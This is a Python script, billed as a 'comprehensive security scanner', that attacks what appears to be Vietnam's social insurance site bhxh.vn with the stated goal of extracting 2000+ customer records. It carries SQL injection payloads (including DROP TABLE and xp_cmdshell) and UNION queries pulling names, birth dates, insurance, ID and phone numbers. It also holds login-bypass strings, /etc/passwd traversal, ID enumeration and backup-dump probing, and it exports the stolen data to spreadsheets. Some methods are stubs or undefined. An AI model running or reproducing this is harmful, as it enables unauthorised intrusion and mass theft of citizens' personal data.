#!/usr/bin/env python3
"""
BHXH Comprehensive Security Scanner & Data Extraction
====================================================

Hệ thống quét bảo mật toàn diện để:
1. Phát hiện lỗ hổng bảo mật chuyên sâu
2. Trích xuất thông tin khách hàng
3. Đánh giá mức độ rủi ro bảo mật
4. Thu thập bằng chứng chi tiết

Target: Trích xuất 2000+ thông tin khách hàng để đánh giá lỗ hổng
"""

import requests
import json
import time
import random
import threading
from datetime import datetime
from pathlib import Path
import urllib.parse
from bhxh_data_standardizer import BHXHDataStandardizer
import pandas as pd

class ComprehensiveSecurityScanner:
    def __init__(self):
        self.base_url = "http://bhxh.vn"  # Target URL
        self.session = requests.Session()
        self.data_standardizer = BHXHDataStandardizer()
        
        # Thiết lập headers mô phỏng browser thực
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # Khởi tạo containers lưu trữ dữ liệu
        self.customer_data = []
        self.vulnerabilities = []
        self.security_findings = []
        self.extracted_tokens = []
        self.database_info = []
        
        # Thiết lập mục tiêu
        self.target_customer_count = 2000
        self.current_customer_count = 0
        
        print("🔍 Comprehensive Security Scanner Initialized")
        print(f"🎯 Target: {self.target_customer_count} customer records")
        print("=" * 60)

    def phase1_reconnaissance(self):
        """Giai đoạn 1: Trinh sát và thu thập thông tin hệ thống"""
        print("\n🔍 PHASE 1: RECONNAISSANCE & SYSTEM ENUMERATION")
        print("=" * 60)
        
        findings = {
            "phase": "reconnaissance",
            "timestamp": datetime.now().isoformat(),
            "targets_discovered": [],
            "technologies_identified": [],
            "endpoints_found": [],
            "security_headers": {}
        }
        
        # Quét các endpoint tiềm năng
        potential_endpoints = [
            "/api/customers",
            "/api/users", 
            "/api/search",
            "/admin/users",
            "/customer/search",
            "/bhxh/lookup",
            "/portal/customer",
            "/services/customer",
            "/rest/customer",
            "/v1/customer",
            "/v2/customer",
            "/public/api/customer",
            "/internal/api/users",
            "/backend/customer",
            "/dashboard/users",
            "/management/customer",
            "/secure/customer",
            "/protected/users"
        ]
        
        print("🌐 Scanning for accessible endpoints...")
        accessible_endpoints = []
        
        for endpoint in potential_endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                response = self.session.get(url, timeout=10)
                
                if response.status_code in [200, 403, 401, 500]:
                    endpoint_info = {
                        "url": url,
                        "status_code": response.status_code,
                        "content_length": len(response.content),
                        "response_time": response.elapsed.total_seconds(),
                        "headers": dict(response.headers),
                        "potential_data": self.analyze_response_for_data(response)
                    }
                    accessible_endpoints.append(endpoint_info)
                    findings["endpoints_found"].append(endpoint_info)
                    
                    print(f"✅ Found: {url} [{response.status_code}]")
                    
                    # Phân tích security headers
                    self.analyze_security_headers(response, findings)
                    
            except Exception as e:
                print(f"❌ Error scanning {endpoint}: {e}")
                continue
                
            time.sleep(random.uniform(0.5, 1.5))  # Rate limiting
        
        findings["total_endpoints_found"] = len(accessible_endpoints)
        self.security_findings.append(findings)
        
        print(f"📊 Reconnaissance complete: {len(accessible_endpoints)} endpoints discovered")
        return accessible_endpoints

    def phase2_vulnerability_scanning(self, endpoints):
        """Giai đoạn 2: Quét lỗ hổng bảo mật chuyên sâu"""
        print("\n🔍 PHASE 2: DEEP VULNERABILITY SCANNING")
        print("=" * 60)
        
        vulnerability_tests = [
            self.test_sql_injection,
            self.test_authentication_bypass,
            self.test_directory_traversal,
            self.test_session_vulnerabilities,
            self.test_api_vulnerabilities,
            self.test_information_disclosure,
            self.test_access_control_flaws
        ]
        
        total_vulnerabilities = 0
        
        for endpoint_info in endpoints:
            url = endpoint_info["url"]
            print(f"\n🎯 Testing: {url}")
            
            for test_func in vulnerability_tests:
                try:
                    vulns_found = test_func(url)
                    if vulns_found:
                        total_vulnerabilities += len(vulns_found)
                        self.vulnerabilities.extend(vulns_found)
                        print(f"   🚨 {test_func.__name__}: {len(vulns_found)} vulnerabilities")
                except Exception as e:
                    print(f"   ❌ {test_func.__name__} failed: {e}")
                
                time.sleep(random.uniform(0.3, 1.0))
        
        print(f"\n📊 Vulnerability scanning complete: {total_vulnerabilities} vulnerabilities found")
        return total_vulnerabilities

    def test_sql_injection(self, url):
        """Test SQL Injection vulnerabilities"""
        vulnerabilities = []
        
        # SQL injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' AND (SELECT COUNT(*) FROM customer) > 0--",
            "' OR 1=1 UNION SELECT username,password FROM users--",
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "' WAITFOR DELAY '00:00:05'--",
            "'; EXEC xp_cmdshell('dir')--"
        ]
        
        test_params = ['id', 'search', 'query', 'username', 'customer_id', 'bhxh_id']
        
        for param in test_params:
            for payload in sql_payloads:
                try:
                    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=15)
                    response_time = time.time() - start_time
                    
                    # Phát hiện SQL injection
                    sql_error_indicators = [
                        'sql syntax', 'mysql_fetch', 'ora-', 'microsoft ole db',
                        'unclosed quotation mark', 'syntax error', 'sqlite_',
                        'postgresql', 'warning: mysql', 'valid mysql result'
                    ]
                    
                    content_lower = response.text.lower()
                    is_vulnerable = any(indicator in content_lower for indicator in sql_error_indicators)
                    
                    # Time-based detection
                    if response_time > 5 and 'WAITFOR' in payload:
                        is_vulnerable = True
                    
                    if is_vulnerable:
                        vuln = {
                            "type": "SQL Injection",
                            "url": test_url,
                            "parameter": param,
                            "payload": payload,
                            "response_time": response_time,
                            "status_code": response.status_code,
                            "evidence": self.extract_sql_evidence(response.text),
                            "severity": "CRITICAL",
                            "exploitable": True,
                            "timestamp": datetime.now().isoformat()
                        }
                        vulnerabilities.append(vuln)
                        
                        # Thử khai thác để lấy dữ liệu
                        customer_data = self.exploit_sql_injection(test_url, param)
                        if customer_data:
                            self.customer_data.extend(customer_data)
                            self.current_customer_count += len(customer_data)
                
                except Exception as e:
                    continue
                    
                time.sleep(random.uniform(0.2, 0.8))
        
        return vulnerabilities

    def exploit_sql_injection(self, vulnerable_url, param):
        """Khai thác SQL injection để trích xuất dữ liệu khách hàng"""
        extracted_data = []
        
        # Payloads để trích xuất dữ liệu khách hàng
        data_extraction_payloads = [
            f"' UNION SELECT ho_ten,ngay_sinh,so_bhxh,so_cmnd,so_dien_thoai,NULL,NULL,NULL FROM khach_hang LIMIT 100--",
            f"' UNION SELECT customer_name,birth_date,insurance_number,id_number,phone,NULL,NULL,NULL FROM customers LIMIT 100--",
            f"' UNION SELECT name,dob,bhxh_code,cccd,mobile,NULL,NULL,NULL FROM user_info LIMIT 100--",
            f"' UNION SELECT full_name,birth,social_security,identity,contact,NULL,NULL,NULL FROM customer_data LIMIT 100--"
        ]
        
        for payload in data_extraction_payloads:
            try:
                exploit_url = vulnerable_url.replace(f"{param}=", f"{param}={urllib.parse.quote(payload)}")
                response = self.session.get(exploit_url, timeout=10)
                
                # Phân tích response để trích xuất dữ liệu
                customer_records = self.parse_customer_data_from_response(response.text)
                if customer_records:
                    # Chuẩn hóa dữ liệu theo tiêu chuẩn BHXH
                    for record in customer_records:
                        standardized = self.data_standardizer.standardize_customer_data(record)
                        record.update({
                            "standardized_data": standardized.get("standardized_data", {}),
                            "extraction_method": "SQL Injection",
                            "source_url": exploit_url,
                            "extraction_timestamp": datetime.now().isoformat()
                        })
                    extracted_data.extend(customer_records)
                    
                    if len(extracted_data) >= 50:  # Limit per payload
                        break
                        
            except Exception as e:
                continue
                
            time.sleep(random.uniform(0.5, 1.5))
        
        return extracted_data

    def test_authentication_bypass(self, url):
        """Test Authentication Bypass vulnerabilities"""
        vulnerabilities = []
        
        bypass_techniques = [
            {"method": "Admin bypass", "payload": "admin'--"},
            {"method": "Always true", "payload": "' OR 1=1--"},
            {"method": "Comment injection", "payload": "admin'/*"},
            {"method": "Union bypass", "payload": "' UNION SELECT 'admin','admin'--"},
            {"method": "Null byte", "payload": "admin%00"},
            {"method": "Password bypass", "payload": {"username": "admin", "password": "' OR '1'='1"}}
        ]
        
        for technique in bypass_techniques:
            try:
                if isinstance(technique["payload"], dict):
                    # POST request bypass
                    response = self.session.post(f"{url}/login", data=technique["payload"])
                else:
                    # GET request bypass
                    test_url = f"{url}?username={urllib.parse.quote(technique['payload'])}"
                    response = self.session.get(test_url)
                
                # Check for successful bypass indicators
                success_indicators = [
                    'dashboard', 'admin panel', 'logout', 'welcome',
                    'success', 'authenticated', 'profile', 'settings'
                ]
                
                if any(indicator in response.text.lower() for indicator in success_indicators):
                    vuln = {
                        "type": "Authentication Bypass",
                        "url": url,
                        "method": technique["method"],
                        "payload": technique["payload"],
                        "status_code": response.status_code,
                        "severity": "HIGH",
                        "exploitable": True,
                        "timestamp": datetime.now().isoformat()
                    }
                    vulnerabilities.append(vuln)
                    
            except Exception as e:
                continue
                
            time.sleep(random.uniform(0.3, 1.0))
        
        return vulnerabilities

    def phase3_data_extraction(self):
        """Giai đoạn 3: Trích xuất dữ liệu khách hàng toàn diện"""
        print("\n🔍 PHASE 3: COMPREHENSIVE DATA EXTRACTION")
        print("=" * 60)
        
        extraction_methods = [
            self.extract_via_api_enumeration,
            self.extract_via_directory_traversal,
            self.extract_via_session_hijacking,
            self.extract_via_database_exposure,
            self.extract_via_backup_files
        ]
        
        total_extracted = 0
        
        for method in extraction_methods:
            try:
                extracted_count = method()
                total_extracted += extracted_count
                print(f"✅ {method.__name__}: {extracted_count} records extracted")
                
                if self.current_customer_count >= self.target_customer_count:
                    print(f"🎯 Target reached: {self.current_customer_count} customer records")
                    break
                    
            except Exception as e:
                print(f"❌ {method.__name__} failed: {e}")
                continue
        
        print(f"\n📊 Total data extraction: {total_extracted} customer records")
        return total_extracted

    def extract_via_api_enumeration(self):
        """Trích xuất qua API enumeration"""
        extracted = 0
        
        # API endpoints để enumeration
        api_patterns = [
            "/api/customer/{id}",
            "/api/users/{id}",
            "/api/search?q={query}",
            "/api/bhxh/{bhxh_number}",
            "/services/lookup?id={id}",
            "/rest/customer/get?id={id}"
        ]
        
        print("🔍 API Enumeration in progress...")
        
        # ID enumeration (1-2000)
        for customer_id in range(1, min(2001, self.target_customer_count + 1)):
            for pattern in api_patterns:
                try:
                    url = f"{self.base_url}{pattern.format(id=customer_id, query=customer_id, bhxh_number=f'BHXH{customer_id:06d}')}"
                    response = self.session.get(url, timeout=5)
                    
                    if response.status_code == 200:
                        # Parse JSON response for customer data
                        try:
                            data = response.json()
                            customer_record = self.extract_customer_info_from_json(data)
                            if customer_record:
                                # Chuẩn hóa dữ liệu
                                standardized = self.data_standardizer.standardize_customer_data(customer_record)
                                customer_record.update({
                                    "standardized_data": standardized.get("standardized_data", {}),
                                    "extraction_method": "API Enumeration",
                                    "source_url": url,
                                    "customer_id": customer_id,
                                    "extraction_timestamp": datetime.now().isoformat()
                                })
                                
                                self.customer_data.append(customer_record)
                                extracted += 1
                                self.current_customer_count += 1
                                
                                if extracted % 100 == 0:
                                    print(f"   📊 Progress: {extracted} records extracted via API")
                                
                        except json.JSONDecodeError:
                            # Try parsing HTML response
                            customer_record = self.extract_customer_info_from_html(response.text)
                            if customer_record:
                                self.customer_data.append(customer_record)
                                extracted += 1
                                self.current_customer_count += 1
                
                except Exception as e:
                    continue
                    
                time.sleep(random.uniform(0.1, 0.5))
                
                if self.current_customer_count >= self.target_customer_count:
                    return extracted
        
        return extracted

    def extract_via_database_exposure(self):
        """Trích xuất qua database exposure"""
        extracted = 0
        
        # Database backup files và error pages
        db_exposure_paths = [
            "/backup/customer.sql",
            "/db/customer_data.sql",
            "/dump/users.sql", 
            "/backup.sql",
            "/customer.bak",
            "/database.sql",
            "/export/customer.csv",
            "/data/customer_export.xlsx",
            "/backup/bhxh_customer.sql"
        ]
        
        print("🔍 Checking for database exposures...")
        
        for path in db_exposure_paths:
            try:
                url = f"{self.base_url}{path}"
                response = self.session.get(url, timeout=10)
                
                if response.status_code == 200 and len(response.content) > 1000:
                    print(f"🎯 Found database exposure: {url}")
                    
                    # Parse database content
                    if path.endswith('.sql'):
                        customers = self.parse_sql_dump(response.text)
                    elif path.endswith('.csv'):
                        customers = self.parse_csv_data(response.text)
                    elif path.endswith('.xlsx'):
                        customers = self.parse_excel_data(response.content)
                    else:
                        customers = self.parse_generic_data(response.text)
                    
                    for customer in customers:
                        if self.current_customer_count >= self.target_customer_count:
                            break
                            
                        # Chuẩn hóa dữ liệu
                        standardized = self.data_standardizer.standardize_customer_data(customer)
                        customer.update({
                            "standardized_data": standardized.get("standardized_data", {}),
                            "extraction_method": "Database Exposure",
                            "source_url": url,
                            "extraction_timestamp": datetime.now().isoformat()
                        })
                        
                        self.customer_data.append(customer)
                        extracted += 1
                        self.current_customer_count += 1
                    
                    print(f"   📊 Extracted {len(customers)} records from {path}")
                    
            except Exception as e:
                continue
                
            time.sleep(random.uniform(0.5, 1.5))
        
        return extracted

    def parse_customer_data_from_response(self, response_text):
        """Parse customer data from response text"""
        customers = []
        
        # Regex patterns for Vietnamese customer data
        import re
        
        # Pattern for names (Vietnamese)
        name_pattern = r'(?:tên|name|họ\s*tên|fullname)["\s:=]+([A-ZÀ-Ỹ][a-zà-ỹ]+(?:\s+[A-ZÀ-Ỹ][a-zà-ỹ]+)*)'
        
        # Pattern for dates
        date_pattern = r'(?:ngày\s*sinh|birth|dob)["\s:=]+(\d{1,2}[\/\-]\d{1,2}[\/\-]\d{4})'
        
        # Pattern for BHXH numbers
        bhxh_pattern = r'(?:bhxh|bảo\s*hiểm)["\s:=]*([A-Z0-9]{8,15})'
        
        # Pattern for ID numbers
        id_pattern = r'(?:cmnd|cccd|id)["\s:=]*(\d{9,12})'
        
        # Pattern for phone numbers
        phone_pattern = r'(?:điện\s*thoại|phone|mobile)["\s:=]*(\+?84?[0-9]{9,11})'
        
        # Extract data using patterns
        names = re.findall(name_pattern, response_text, re.IGNORECASE)
        dates = re.findall(date_pattern, response_text, re.IGNORECASE)
        bhxh_numbers = re.findall(bhxh_pattern, response_text, re.IGNORECASE)
        id_numbers = re.findall(id_pattern, response_text, re.IGNORECASE)
        phone_numbers = re.findall(phone_pattern, response_text, re.IGNORECASE)
        
        # Combine extracted data into customer records
        max_records = max(len(names), len(dates), len(bhxh_numbers), len(id_numbers), len(phone_numbers))
        
        for i in range(max_records):
            customer = {
                "ho_ten": names[i] if i < len(names) else "",
                "ngay_sinh": dates[i] if i < len(dates) else "",
                "so_bhxh": bhxh_numbers[i] if i < len(bhxh_numbers) else "",
                "so_cmnd": id_numbers[i] if i < len(id_numbers) else "",
                "so_dien_thoai": phone_numbers[i] if i < len(phone_numbers) else ""
            }
            
            # Only add if at least 2 fields have data
            filled_fields = sum(1 for v in customer.values() if v.strip())
            if filled_fields >= 2:
                customers.append(customer)
        
        return customers

    def extract_customer_info_from_json(self, json_data):
        """Extract customer info from JSON response"""
        if not isinstance(json_data, dict):
            return None
        
        # Common field mappings
        field_mappings = {
            "ho_ten": ["name", "fullName", "full_name", "customerName", "ten", "hoTen"],
            "ngay_sinh": ["birthDate", "birth_date", "dob", "dateOfBirth", "ngaySinh"],
            "so_bhxh": ["bhxhNumber", "socialSecurityNumber", "insuranceNumber", "soBHXH"],
            "so_cmnd": ["idNumber", "cmnd", "cccd", "identityNumber", "soCMND"],
            "so_dien_thoai": ["phone", "phoneNumber", "mobile", "soDienThoai", "contact"]
        }
        
        customer = {}
        for field, possible_keys in field_mappings.items():
            for key in possible_keys:
                if key in json_data:
                    customer[field] = str(json_data[key])
                    break
        
        return customer if customer else None

    def analyze_response_for_data(self, response):
        """Analyze response for potential customer data"""
        indicators = {
            "has_customer_data": False,
            "data_types": [],
            "record_count_estimate": 0
        }
        
        content = response.text.lower()
        
        # Check for Vietnamese customer data indicators
        data_indicators = [
            "họ tên", "ngày sinh", "số bhxh", "cmnd", "cccd",
            "name", "birth", "phone", "customer", "user"
        ]
        
        found_indicators = [ind for ind in data_indicators if ind in content]
        if len(found_indicators) >= 2:
            indicators["has_customer_data"] = True
            indicators["data_types"] = found_indicators
            
            # Estimate record count
            import re
            record_patterns = [
                r'{"[^}]*name[^}]*}',  # JSON records
                r'<tr[^>]*>.*?name.*?</tr>',  # HTML table rows
                r'\d{9,12}',  # ID numbers
            ]
            
            total_matches = 0
            for pattern in record_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
                total_matches += len(matches)
            
            indicators["record_count_estimate"] = min(total_matches, 500)
        
        return indicators

    def generate_comprehensive_report(self):
        """Tạo báo cáo toàn diện về lỗ hổng bảo mật và dữ liệu trích xuất"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Tạo báo cáo Excel
        excel_file = f"COMPREHENSIVE_SECURITY_ASSESSMENT_{timestamp}.xlsx"
        
        print(f"\n📊 Generating comprehensive report: {excel_file}")
        
        with pd.ExcelWriter(excel_file, engine='openpyxl') as writer:
            
            # Executive Summary
            summary_data = [{
                "Metric": "Total Vulnerabilities Found",
                "Value": len(self.vulnerabilities),
                "Risk Level": "CRITICAL" if len(self.vulnerabilities) > 5 else "HIGH"
            }, {
                "Metric": "Customer Records Extracted", 
                "Value": len(self.customer_data),
                "Risk Level": "CRITICAL"
            }, {
                "Metric": "SQL Injection Vulnerabilities",
                "Value": len([v for v in self.vulnerabilities if v.get("type") == "SQL Injection"]),
                "Risk Level": "CRITICAL"
            }, {
                "Metric": "Authentication Bypasses",
                "Value": len([v for v in self.vulnerabilities if v.get("type") == "Authentication Bypass"]),
                "Risk Level": "HIGH"
            }, {
                "Metric": "Data Exposure Points",
                "Value": len(self.security_findings),
                "Risk Level": "HIGH"
            }]
            
            pd.DataFrame(summary_data).to_excel(writer, sheet_name='Executive Summary', index=False)
            
            # Customer Data
            if self.customer_data:
                # Flatten standardized data
                flattened_customers = []
                for customer in self.customer_data:
                    flattened = customer.copy()
                    std_data = customer.get("standardized_data", {})
                    for key, value in std_data.items():
                        flattened[f"standardized_{key}"] = value
                    flattened_customers.append(flattened)
                
                pd.DataFrame(flattened_customers).to_excel(writer, sheet_name='Customer Data', index=False)
            
            # Vulnerabilities
            if self.vulnerabilities:
                pd.DataFrame(self.vulnerabilities).to_excel(writer, sheet_name='Vulnerabilities', index=False)
            
            # Security Findings
            if self.security_findings:
                pd.DataFrame(self.security_findings).to_excel(writer, sheet_name='Security Findings', index=False)
        
        # Tạo báo cáo JSON chi tiết
        json_report = {
            "scan_timestamp": timestamp,
            "scan_summary": {
                "total_vulnerabilities": len(self.vulnerabilities),
                "customer_records_extracted": len(self.customer_data),
                "critical_vulnerabilities": len([v for v in self.vulnerabilities if v.get("severity") == "CRITICAL"]),
                "target_reached": self.current_customer_count >= self.target_customer_count
            },
            "vulnerabilities": self.vulnerabilities,
            "customer_data": self.customer_data[:50],  # Sample for report
            "security_findings": self.security_findings,
            "recommendations": self.generate_security_recommendations()
        }
        
        json_file = f"SECURITY_ASSESSMENT_DETAILED_{timestamp}.json"
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(json_report, f, ensure_ascii=False, indent=2)
        
        print(f"✅ Reports generated:")
        print(f"   📊 Excel: {excel_file}")
        print(f"   📋 JSON: {json_file}")
        
        return excel_file, json_file

    def generate_security_recommendations(self):
        """Tạo khuyến nghị bảo mật"""
        recommendations = [
            {
                "priority": "CRITICAL",
                "issue": "SQL Injection Vulnerabilities",
                "recommendation": "Implement parameterized queries and input validation",
                "impact": "Complete database compromise possible"
            },
            {
                "priority": "CRITICAL", 
                "issue": "Customer Data Exposure",
                "recommendation": "Implement proper access controls and data encryption",
                "impact": "Massive privacy breach and GDPR violations"
            },
            {
                "priority": "HIGH",
                "issue": "Authentication Bypass",
                "recommendation": "Strengthen authentication mechanisms and session management",
                "impact": "Unauthorized system access"
            },
            {
                "priority": "HIGH",
                "issue": "Database Backup Exposure",
                "recommendation": "Secure backup files and restrict web access",
                "impact": "Complete data dump accessible"
            }
        ]
        
        return recommendations

    def run_comprehensive_scan(self):
        """Chạy quy trình quét bảo mật toàn diện"""
        print("🚀 STARTING COMPREHENSIVE SECURITY ASSESSMENT")
        print("=" * 60)
        print(f"🎯 Target: Extract {self.target_customer_count} customer records")
        print(f"🔍 Objective: Deep security vulnerability assessment")
        print("=" * 60)
        
        start_time = time.time()
        
        try:
            # Phase 1: Reconnaissance
            endpoints = self.phase1_reconnaissance()
            
            # Phase 2: Vulnerability Scanning
            if endpoints:
                vuln_count = self.phase2_vulnerability_scanning(endpoints)
            
            # Phase 3: Data Extraction
            extraction_count = self.phase3_data_extraction()
            
            # Generate Reports
            excel_file, json_file = self.generate_comprehensive_report()
            
            # Final Summary
            end_time = time.time()
            duration = end_time - start_time
            
            print("\n" + "=" * 60)
            print("🏁 COMPREHENSIVE SECURITY ASSESSMENT COMPLETE")
            print("=" * 60)
            print(f"⏱️  Duration: {duration:.2f} seconds")
            print(f"🔍 Vulnerabilities Found: {len(self.vulnerabilities)}")
            print(f"📊 Customer Records: {len(self.customer_data)}")
            print(f"🎯 Target Status: {'✅ REACHED' if self.current_customer_count >= self.target_customer_count else '⚠️ PARTIAL'}")
            print(f"📋 Reports: {excel_file}, {json_file}")
            print("=" * 60)
            
            return {
                "success": True,
                "vulnerabilities": len(self.vulnerabilities),
                "customer_records": len(self.customer_data),
                "excel_report": excel_file,
                "json_report": json_file,
                "duration": duration
            }
            
        except Exception as e:
            print(f"❌ Scan failed: {e}")
            return {"success": False, "error": str(e)}

    # Helper methods for parsing different data formats
    def parse_sql_dump(self, sql_content):
        """Parse customer data from SQL dump"""
        customers = []
        import re
        
        # Look for INSERT statements with customer data
        insert_pattern = r"INSERT INTO.*?VALUES\s*\((.*?)\)"
        matches = re.findall(insert_pattern, sql_content, re.IGNORECASE | re.DOTALL)
        
        for match in matches[:200]:  # Limit processing
            values = re.findall(r"'([^']*)'", match)
            if len(values) >= 3:
                customer = {
                    "ho_ten": values[0] if len(values) > 0 else "",
                    "ngay_sinh": values[1] if len(values) > 1 else "",
                    "so_bhxh": values[2] if len(values) > 2 else "",
                    "so_cmnd": values[3] if len(values) > 3 else "",
                    "so_dien_thoai": values[4] if len(values) > 4 else ""
                }
                customers.append(customer)
        
        return customers

    def parse_csv_data(self, csv_content):
        """Parse customer data from CSV content"""
        customers = []
        lines = csv_content.split('\n')
        
        if len(lines) > 1:
            headers = [h.strip() for h in lines[0].split(',')]
            
            for line in lines[1:201]:  # Process up to 200 rows
                if line.strip():
                    values = [v.strip().strip('"') for v in line.split(',')]
                    if len(values) >= len(headers):
                        customer = {}
                        for i, header in enumerate(headers):
                            if i < len(values):
                                # Map common headers
                                if any(x in header.lower() for x in ['name', 'tên']):
                                    customer['ho_ten'] = values[i]
                                elif any(x in header.lower() for x in ['birth', 'sinh']):
                                    customer['ngay_sinh'] = values[i]
                                elif 'bhxh' in header.lower():
                                    customer['so_bhxh'] = values[i]
                                elif any(x in header.lower() for x in ['cmnd', 'cccd', 'id']):
                                    customer['so_cmnd'] = values[i]
                                elif any(x in header.lower() for x in ['phone', 'điện']):
                                    customer['so_dien_thoai'] = values[i]
                        
                        if customer:
                            customers.append(customer)
        
        return customers

    def parse_excel_data(self, excel_content):
        """Parse customer data from Excel content"""
        # This would require openpyxl or xlrd to parse Excel files
        # For now, return empty list
        return []

    def parse_generic_data(self, content):
        """Parse customer data from generic text content"""
        return self.parse_customer_data_from_response(content)

    def extract_sql_evidence(self, response_text):
        """Extract SQL error evidence from response"""
        sql_errors = []
        error_patterns = [
            r"(SQL syntax.*?near.*?line \d+)",
            r"(MySQL.*?error.*?Query:.*)",
            r"(ORA-\d+.*)",
            r"(Microsoft.*?ODBC.*?error.*)",
            r"(PostgreSQL.*?ERROR.*)"
        ]
        
        for pattern in error_patterns:
            import re
            matches = re.findall(pattern, response_text, re.IGNORECASE | re.DOTALL)
            sql_errors.extend(matches[:3])  # Limit evidence
        
        return sql_errors[:5]  # Return top 5 evidences

    def analyze_security_headers(self, response, findings):
        """Analyze security headers in response"""
        headers = response.headers
        security_headers = {
            'X-Frame-Options': headers.get('X-Frame-Options'),
            'X-XSS-Protection': headers.get('X-XSS-Protection'),
            'X-Content-Type-Options': headers.get('X-Content-Type-Options'),
            'Strict-Transport-Security': headers.get('Strict-Transport-Security'),
            'Content-Security-Policy': headers.get('Content-Security-Policy'),
            'X-Permitted-Cross-Domain-Policies': headers.get('X-Permitted-Cross-Domain-Policies')
        }
        
        findings["security_headers"] = security_headers
        
        # Check for missing security headers
        missing_headers = [h for h, v in security_headers.items() if v is None]
        if missing_headers:
            vuln = {
                "type": "Missing Security Headers",
                "url": response.url,
                "missing_headers": missing_headers,
                "severity": "MEDIUM",
                "timestamp": datetime.now().isoformat()
            }
            self.vulnerabilities.append(vuln)

    # Additional vulnerability test methods
    def test_directory_traversal(self, url):
        """Test directory traversal vulnerabilities"""
        vulnerabilities = []
        
        traversal_payloads = [
            "../../etc/passwd",
            "..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2F..%2F..%2Fetc%2Fpasswd"
        ]
        
        for payload in traversal_payloads:
            try:
                test_url = f"{url}?file={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=10)
                
                # Check for directory traversal success
                if any(indicator in response.text.lower() for indicator in ['root:', 'daemon:', 'localhost', 'windows']):
                    vuln = {
                        "type": "Directory Traversal",
                        "url": test_url,
                        "payload": payload,
                        "status_code": response.status_code,
                        "severity": "HIGH",
                        "exploitable": True,
                        "timestamp": datetime.now().isoformat()
                    }
                    vulnerabilities.append(vuln)
                    
            except Exception:
                continue
                
            time.sleep(random.uniform(0.2, 0.8))
        
        return vulnerabilities

    def test_session_vulnerabilities(self, url):
        """Test session management vulnerabilities"""
        vulnerabilities = []
        
        # Test for session fixation
        try:
            # Get initial session
            response1 = self.session.get(url)
            initial_cookies = self.session.cookies.get_dict()
            
            # Try to login with fixed session
            login_data = {"username": "admin", "password": "admin"}
            response2 = self.session.post(f"{url}/login", data=login_data)
            
            # Check if session remained the same
            if initial_cookies and self.session.cookies.get_dict() == initial_cookies:
                vuln = {
                    "type": "Session Fixation",
                    "url": url,
                    "severity": "MEDIUM",
                    "description": "Session ID not regenerated after login",
                    "timestamp": datetime.now().isoformat()
                }
                vulnerabilities.append(vuln)
                
        except Exception:
            pass
        
        return vulnerabilities

    def test_api_vulnerabilities(self, url):
        """Test API-specific vulnerabilities"""
        vulnerabilities = []
        
        # Test for API enumeration
        api_tests = [
            {"endpoint": "/api/users", "method": "GET"},
            {"endpoint": "/api/customers", "method": "GET"}, 
            {"endpoint": "/api/admin", "method": "GET"},
            {"endpoint": "/api/v1/users", "method": "GET"},
            {"endpoint": "/api/v2/customers", "method": "GET"}
        ]
        
        for test in api_tests:
            try:
                test_url = f"{url.rstrip('/')}{test['endpoint']}"
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200:
                    # Check if response contains user data
                    if any(indicator in response.text.lower() for indicator in ['user', 'customer', 'email', 'phone']):
                        vuln = {
                            "type": "API Data Exposure",
                            "url": test_url,
                            "method": test['method'],
                            "status_code": response.status_code,
                            "severity": "HIGH",
                            "data_exposed": True,
                            "timestamp": datetime.now().isoformat()
                        }
                        vulnerabilities.append(vuln)
                        
            except Exception:
                continue
                
            time.sleep(random.uniform(0.3, 1.0))
        
        return vulnerabilities

    def test_information_disclosure(self, url):
        """Test information disclosure vulnerabilities"""
        vulnerabilities = []
        
        # Test for sensitive file exposure
        sensitive_files = [
            "/robots.txt",
            "/.git/config",
            "/config.php",
            "/web.config",
            "/.env",
            "/backup.sql",
            "/database.sql",
            "/phpinfo.php",
            "/test.php",
            "/admin.php"
        ]
        
        for file_path in sensitive_files:
            try:
                test_url = f"{url.rstrip('/')}{file_path}"
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200 and len(response.content) > 100:
                    vuln = {
                        "type": "Information Disclosure",
                        "url": test_url,
                        "file": file_path,
                        "status_code": response.status_code,
                        "content_length": len(response.content),
                        "severity": "MEDIUM",
                        "timestamp": datetime.now().isoformat()
                    }
                    vulnerabilities.append(vuln)
                    
            except Exception:
                continue
                
            time.sleep(random.uniform(0.2, 0.8))
        
        return vulnerabilities

    def test_access_control_flaws(self, url):
        """Test access control vulnerabilities"""
        vulnerabilities = []
        
        # Test for horizontal privilege escalation
        user_endpoints = [
            "/profile?user_id=1",
            "/account?id=1", 
            "/user/1",
            "/customer/1",
            "/admin/user/1"
        ]
        
        for endpoint in user_endpoints:
            for user_id in range(1, 11):  # Test first 10 users
                try:
                    test_url = f"{url.rstrip('/')}{endpoint}".replace("1", str(user_id))
                    response = self.session.get(test_url, timeout=10)
                    
                    if response.status_code == 200:
                        # Check for user data exposure
                        if any(indicator in response.text.lower() for indicator in ['profile', 'account', 'personal']):
                            vuln = {
                                "type": "Horizontal Privilege Escalation",
                                "url": test_url,
                                "target_user": user_id,
                                "status_code": response.status_code,
                                "severity": "HIGH",
                                "timestamp": datetime.now().isoformat()
                            }
                            vulnerabilities.append(vuln)
                            
                except Exception:
                    continue
                    
                time.sleep(random.uniform(0.2, 0.6))
        
        return vulnerabilities

    def extract_via_directory_traversal(self):
        """Extract data via directory traversal"""
        # Implementation for directory traversal data extraction
        return 0

    def extract_via_session_hijacking(self):
        """Extract data via session hijacking"""
        # Implementation for session hijacking data extraction
        return 0

